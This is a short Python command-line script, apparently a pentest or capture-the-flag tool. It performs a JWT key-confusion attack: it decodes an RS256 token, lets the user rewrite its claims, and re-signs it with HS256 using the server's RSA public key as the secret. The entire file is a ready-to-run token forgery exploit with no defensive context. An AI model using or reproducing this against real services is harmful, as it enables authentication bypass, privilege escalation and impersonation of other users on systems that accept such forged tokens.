#!/usr/bin/env python3

import jwt
import sys
import binascii
import json
import base64
import pickle


def usage():
    print("./jwt_rsa256.py <file_public_key.pem> <token_rsa>")
    sys.exit(1)

def create_hex_pubkey(pubkey):
    print("\n\033[1mheader:\033[0m", pubkey)
    hexa = pubkey.encode().hex()
    return (hexa)


if __name__ == "__main__":
    if len(sys.argv) < 3 or sys.argv[1] == '-h':
        print("File change jwt rsa256 token on jwt sha256 token")
        usage()

    with open(sys.argv[1], 'r') as fd:
        pubkey = fd.read()
        hexa = create_hex_pubkey(pubkey)
        header, payload, signature = sys.argv[2].split(".")
        print("\033[1mheader:\033[0m", header)
        print("\033[1mpayload:\033[0m", payload)
        print("\033[1msignature:\033[0m", signature)
        decode_header = json.loads(base64.b64decode(header))
        decode_payload = json.loads(base64.b64decode(payload))
        typ = decode_header["typ"]
        alg = decode_header["alg"]
        print("\n\033[1mHeader is:\033[0m\ntyp: \033[95m{}\033[0m\nalg: \033[95m{}\033[0m\n".format(typ, alg))
        print("\033[1mPayload is:\033[0m\n", decode_payload)
        prompt = input("\033[95m[1] Modify payload\n[2] générate JWT HS256\033[0m\n$>")
        if prompt == "1":
            new_payload_dict = {}
            isOk = "2"
            while isOk == "2":
                new_payload = input("\033[1mexample:\033[0m$>key1:value1, key2:value2\n$>")
                new_payload_tab = new_payload.split(',')
                for new in new_payload_tab:
                    tmp = new.split(':')
                    new_payload_dict[tmp[0]] = tmp[1]
                print("\033[1mNew payload is:\033[0m\n", new_payload_dict)
                isOk = input("\033[95m[1] It's Ok\n[2] Change\033[0m\n$>")
                decode_payload = new_payload_dict
        try:
            results = jwt.encode(decode_payload, pubkey, algorithm='HS256').decode("utf-8")
            print("\033[92mSUCESS:", results, "\033[0m")
        except:
            print("\033[91mERROR\033[0m")
